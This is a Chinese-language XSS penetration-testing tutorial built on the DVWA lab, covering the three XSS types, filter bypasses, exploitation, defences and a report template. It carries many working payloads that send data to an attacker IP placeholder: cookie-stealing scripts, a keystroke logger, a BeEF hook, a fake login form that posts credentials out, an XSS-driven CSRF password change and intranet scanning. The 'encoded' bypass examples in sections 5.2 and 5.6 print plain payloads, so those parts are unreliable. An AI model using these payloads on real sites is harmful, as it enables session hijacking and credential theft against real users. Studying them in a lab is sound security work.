---
title: XSS
date: 2026-07-22
tags: [漏洞,DVWA]
---

# XSS 完整渗透测试流程

XSS（Cross-Site Scripting，跨站脚本攻击）是指攻击者将恶意脚本注入到网页中，当其他用户浏览该页面时，脚本在用户浏览器中执行，从而窃取信息、劫持会话或进行钓鱼攻击。

---

## XSS 三种类型对比

| 类型 | 触发方式 | 持久性 | 危害 |
|------|---------|--------|------|
| 反射型（Reflected） | 恶意链接，用户点击触发 | 非持久 | 中 |
| 存储型（Stored） | 恶意代码存入数据库 | 持久 | 高 |
| DOM 型（DOM-based） | 前端 JS 直接操作 DOM | 非持久 | 中 |

- **反射型**：你发了个带毒链接，服务器把毒拿过来原封不动端给浏览器。**看服务器响应源码就能发现**。
- **DOM型**：你发了个带毒链接，服务器端给你干净的代码，是代码里本地的JS自己从URL里抓了毒吃下去。**看服务器响应源码是干净的，问题在客户端JS**。

---

## 阶段一：判断 XSS 注入点

### 1.1 基础测试 Payload

在所有输入框、URL 参数、HTTP Header 中尝试：

```html
<script>alert(1)</script>
```

**预期**：弹出对话框显示 `1`，说明存在 XSS。

---

### 1.2 测试位置

| 位置 | 示例 |
|------|------|
| 输入框 | 姓名、评论、搜索框 |
| URL 参数 | `?name=<script>alert(1)</script>` |
| HTTP Header | User-Agent、Referer、X-Forwarded-For |
| Cookie | 某些网站会把 Cookie 内容渲染到页面 |

---

### 1.3 判断输出位置

在输入框输入一个唯一字符串（如 `xsstest123`），右键 → 查看页面源码，搜索 `xsstest123`，看它出现在哪里：

| 输出位置 | 示例 | 利用方式 |
|---------|------|---------|
| HTML 标签之间 | `<p>xsstest123</p>` | `<script>alert(1)</script>` |
| 标签属性值 | `<input value="xsstest123">` | `" onmouseover="alert(1)` |
| JS 变量中 | `var name = "xsstest123"` | `";alert(1)//` |
| URL 中 | `<a href="xsstest123">` | `javascript:alert(1)` |

---

## 阶段二：反射型 XSS（Reflected XSS）

### 2.1 原理

```
用户输入 → 服务器接收 → 直接拼接到 HTML 响应 → 浏览器执行
```

**不存储在数据库**，每次需要用户点击恶意链接才能触发。

---

### 2.2 DVWA Low 级别（无过滤）

**后端代码**：
```php
$name = $_GET['name'];
echo "<p>Hello " . $name . "</p>";
```

**测试 Payload**：
```html
<script>alert(1)</script>
```

**页面 URL**：
```
http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit
```

✅ 直接弹窗

---

### 2.3 DVWA Medium 级别（过滤 `<script>`）

**后端代码（过滤逻辑）**：
```php
$name = str_replace('<script>', '', $_GET['name']);
```

**绕过方法一：大小写绕过**
```html
<Script>alert(1)</Script>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</sCrIpT>
```

**绕过方法二：嵌套绕过**（过滤一次但不递归）
```html
<sc<script>ript>alert(1)</script>
```

过滤 `<script>` 后变成：
```html
<script>alert(1)</script>
```

✅ 仍然执行

**绕过方法三：换标签**
```html
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
```

---

### 2.4 DVWA High 级别（正则过滤）

**后端代码（过滤逻辑）**：
```php
$name = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['name']);
```

完全封死了 `<script>` 标签（不区分大小写），**换其他标签**：

```html
<img src=x onerror="alert(1)">
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

---

### 2.5 反射型 XSS 实际利用：Cookie 劫持

**攻击目标**：偷取目标用户的 Cookie，接管其会话

**步骤一：构造恶意 JS，发送 Cookie 到攻击者服务器**

```javascript
<script>
  document.location='http://攻击者IP/steal?cookie='+document.cookie;
</script>
```

**步骤二：URL 编码，构造恶意链接**
```
http://目标网站/vulnerabilities/xss_r/?name=<script>document.location='http://攻击者IP/steal?c='+document.cookie</script>
```

**步骤三：把链接发给受害者**（社工、钓鱼邮件）

**步骤四：攻击者监听请求，收到 Cookie**（用 Python 起个简单的 HTTP 服务）
```bash
python -m http.server 80
```

受害者点击链接后，攻击者的日志里会出现：
```
GET /steal?c=PHPSESSID=abc123; security=low HTTP/1.1
```

**步骤五：在 Burp 或浏览器中替换 Cookie，接管会话**

---

## 阶段三：存储型 XSS（Stored XSS）

### 3.1 原理

```
用户输入 → 服务器接收 → 存入数据库 → 其他用户访问页面时触发
```

**危害远大于反射型**：不需要发恶意链接，所有访问该页面的用户都会中招。

---

### 3.2 DVWA Low 级别

**场景**：留言板（Guestbook）

**Payload**（在评论框输入）：
```html
<script>alert(document.cookie)</script>
```

提交后，**每次有人访问留言板都会弹出 Cookie**。

---

### 3.3 存储型 XSS 实际利用：键盘记录器

**在评论框提交**：
```html
<script>
document.onkeypress = function(e) {
  new Image().src = 'http://攻击者IP/log?k=' + String.fromCharCode(e.which);
}
</script>
```

所有访问该页面的用户，**按键都会被发送到攻击者服务器**。

---

### 3.4 存储型 XSS 利用：BeEF 框架

BeEF（Browser Exploitation Framework）是专门利用 XSS 的后渗透工具。

**步骤一：Kali 启动 BeEF**

```bash
beef-xss
```

访问 `http://127.0.0.1:3000/ui/panel`，默认账号 `beef` / `beef`

**步骤二：注入 BeEF Hook**

在存储型 XSS 的输入框提交：
```html
<script src="http://你的Kali_IP:3000/hook.js"></script>
```

**步骤三：等待受害者上线**

当有人访问含有这段代码的页面，BeEF 后台会显示一个上线的浏览器（Zombie）。

**步骤四：控制受害者浏览器**

在 BeEF 面板可以执行：
- 弹出钓鱼登录框（伪造 Google/Facebook 登录页）
- 扫描受害者内网
- 截取受害者屏幕
- 重定向到恶意页面

---

## 阶段四：DOM 型 XSS（DOM-based XSS）

### 4.1 原理

DOM XSS 完全发生在**浏览器端（前端 JS）**，数据不经过服务器，服务器响应的 HTML 本身没有问题，漏洞在 JS 代码里。

**易受攻击的 JS 代码模式**：

```javascript
// 危险：直接把 URL 参数写入 innerHTML
document.getElementById('output').innerHTML = location.hash.substring(1);

// 危险：eval 执行 URL 参数
eval(location.search.substring(1));

// 危险：document.write 写入 URL 参数
document.write(location.href);
```

---

### 4.2 DVWA Low 级别

**后端 HTML 中的 JS 代码**：

```javascript
var size = $_GET['default'];
if (document.location.href.indexOf('default=') >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf('default=')+8);
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
}
```

直接把 URL 中的 `default` 参数写入了 `document.write`

**Payload**：

```
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

---

### 4.3 DOM XSS 和反射型的区别

| 对比项 | 反射型 XSS | DOM 型 XSS |
|--------|-----------|-----------|
| 数据流向 | 经过服务器 | 不经过服务器 |
| 服务器日志 | 有记录 | 无记录（`#` 后的内容不发往服务器） |
| 检测方式 | 看 HTTP 响应 | 看前端 JS 代码 |
| 利用特殊性 | URL 参数触发 | `#` 锚点触发 |

**DOM XSS 特有的 Payload 格式（用 # 绕过服务器）**：

```
http://目标/?#<img src=x onerror=alert(1)>
```

`#` 后面的内容不会发往服务器，WAF 无法检测。

---

## 阶段五：绕过过滤技巧

### 5.1 HTML 编码绕过

当 `<>` 被过滤时，用 HTML 实体编码：
```
&#60;script&#62;alert(1)&#60;/script&#62;
```

等价于：
```html
<script>alert(1)</script>
```

---

### 5.2 JavaScript 编码绕过

```javascript
<script>alert(1)</script>
```

---

### 5.3 事件处理器绕过（不用 `<script>`）

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
```

---

### 5.4 空格被过滤时

```html
<!-- 用 / 代替空格 -->
<img/src=x/onerror=alert(1)>

<!-- 用回车/tab -->
<img src=x
onerror=alert(1)>
```

---

### 5.5 引号被过滤时

```html
<!-- 不用引号 -->
<img src=x onerror=alert(1)>

<!-- 用反引号 -->
<img src=`x` onerror=`alert(1)`>
```

---

### 5.6 alert 被过滤时

```javascript
confirm(1)
prompt(1)
console.log(1)
// 编码后的 alert
alert(1)
eval('\x61lert(1)')
```

---

### 5.7 WAF 绕过常用技巧

```html
<!-- 大小写混合 -->
<ScRiPt>alert(1)</sCrIpT>

<!-- 注释干扰 -->
<scr<!-- -->ipt>alert(1)</script>

<!-- 双重编码 -->
%253Cscript%253Ealert(1)%253C/script%253E
```

---

## 阶段六：XSS 进阶利用

### 6.1 XSS + CSRF 组合攻击

**场景**：目标网站修改密码的接口没有 CSRF 防护

**注入 Payload（在存储型 XSS 点提交）**：
```javascript
<script>
fetch('/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change', {
  credentials: 'include'
});
</script>
```

当管理员访问留言板，**密码被自动修改成 `hacked`**，无需管理员任何交互。

---

### 6.2 XSS 钓鱼（伪造登录框）

```javascript
<script>
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h2>会话已过期，请重新登录</h2>
  <form action="http://攻击者IP/steal" method="GET">
    用户名：<input name="user"><br>
    密码：<input type="password" name="pass"><br>
    <input type="submit" value="登录">
  </form>
</div>`;
</script>
```

---

### 6.3 XSS 内网扫描

```javascript
<script>
for(let i=1; i<255; i++){
  let img = new Image();
  img.src = 'http://192.168.1.' + i + ':80/';
  img.onload = () => fetch('http://攻击者IP/found?ip=192.168.1.' + i);
}
</script>
```

可探测受害者浏览器所在内网的存活主机。

---

## 阶段七：防御与修复

### 7.1 漏洞成因

```php
// 危险代码
echo "<p>Hello " . $_GET['name'] . "</p>";
```

用户输入直接拼接到 HTML，未做任何处理。

---

### 7.2 防御方法

#### 方法一：输出编码（最重要）

```php
// 安全代码
echo "<p>Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</p>";
```

`htmlspecialchars()` 将特殊字符转成 HTML 实体：

| 字符 | 编码后 |
|------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#039;` |
| `&` | `&amp;` |

---

#### 方法二：CSP（内容安全策略）

在 HTTP 响应头添加：
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

即使注入了 `<script>`，浏览器也**拒绝执行来自外部的脚本**。

---

#### 方法三：HttpOnly Cookie

```php
setcookie('session', $value, ['httponly' => true]);
```

设置后，JS 无法读取 Cookie（`document.cookie` 看不到），即使 XSS 成功也偷不到 Cookie。

---

#### 方法四：输入过滤（辅助防御）

```php
// 白名单：只允许字母数字
$name = preg_replace('/[^a-zA-Z0-9]/', '', $_GET['name']);
```

**注意**：输入过滤不能作为唯一防御，因为绕过方法很多，**必须结合输出编码一起用**。

---

## 阶段八：渗透测试报告模板

### 漏洞标题
```
存储型 XSS 漏洞 - DVWA 留言板功能
```

### 漏洞等级
**高危**（可劫持任意用户会话、修改页面内容）

### 漏洞描述
```
目标系统留言板功能存在存储型 XSS 漏洞，攻击者提交包含恶意脚本的留言后，
所有访问该留言板的用户浏览器都会执行恶意代码，可导致 Cookie 劫持、会话
接管、页面篡改等危害。
```

### 漏洞位置
```
URL: http://127.0.0.1/dvwa/vulnerabilities/xss_s/
参数: mtxMessage（POST 参数）
触发条件: 访问留言板页面
```

### 复现步骤

**步骤一：注入 Payload**
```
在 Message 输入框提交：
<script>alert(document.cookie)</script>
```

**步骤二：验证持久化**
```
刷新页面，仍然弹出 Cookie，证明 Payload 已存入数据库
```

**步骤三：Cookie 劫持 PoC**
```
<script>new Image().src='http://攻击者IP/?c='+document.cookie</script>
攻击者服务器收到：PHPSESSID=xxx; security=low
```

### 漏洞影响
1. **会话劫持**：获取管理员 Cookie，接管账号
2. **页面篡改**：修改页面内容，进行钓鱼攻击
3. **蠕虫传播**：XSS 蠕虫可自动传播（MySpace 蠕虫事件）
4. **内网探测**：利用受害者浏览器探测内网

### 修复建议
1. 对所有输出到 HTML 的数据使用 `htmlspecialchars()` 编码
2. 设置 Cookie 的 `HttpOnly` 属性，防止 JS 读取
3. 添加 CSP 响应头，限制脚本来源
4. 对富文本内容使用白名单过滤（如 HTMLPurifier）

---

## 附录：XSS Payload 速查表

### 基础验证
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

### 不用 script 标签
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
```

### 属性值注入
```html
" onmouseover="alert(1)
" onclick="alert(1)
" onfocus="alert(1)" autofocus="
```

### JS 上下文注入
```javascript
";alert(1)//
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

### URL 属性注入
```html
javascript:alert(1)
```

### Cookie 劫持
```javascript
<script>document.location='http://攻击者IP/?c='+document.cookie</script>
<script>new Image().src='http://攻击者IP/?c='+document.cookie</script>
```

### BeEF Hook
```html
<script src="http://攻击者IP:3000/hook.js"></script>
```

---

## 学习检查清单

- [ ] 理解 XSS 的三种类型及危害差异
- [ ] 能手工测试反射型 XSS（DVWA Low）
- [ ] 能绕过 Medium 级别的 `<script>` 过滤
- [ ] 能绕过 High 级别的正则过滤
- [ ] 理解存储型 XSS 和反射型的区别
- [ ] 能用存储型 XSS 劫持 Cookie
- [ ] 理解 DOM XSS 的原理和测试方法
- [ ] 掌握至少 5 种绕过过滤的方法
- [ ] 理解 HttpOnly 和 CSP 的防御作用
- [ ] 能写出规范的 XSS 渗透测试报告
- [ ] 了解 BeEF 框架的基本使用
